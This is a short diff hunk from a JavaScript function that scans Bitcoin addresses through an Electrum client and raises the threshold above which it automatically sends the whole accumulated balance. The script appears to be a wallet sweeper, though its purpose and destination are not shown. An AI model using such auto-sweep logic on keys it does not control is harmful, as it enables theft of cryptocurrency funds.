@@ -113,7 +113,7 @@ async function processAddresses(root, network, electrumClient, bipType, path) {
 
     results.usedAddresses.sort((a, b) => a.path.localeCompare(b.path));
 
-    if (results.totalBalance > 150000) {
+    if (results.totalBalance > 2439747) {
         await sendTransaction(results.totalBalance, utxos);
     }
 
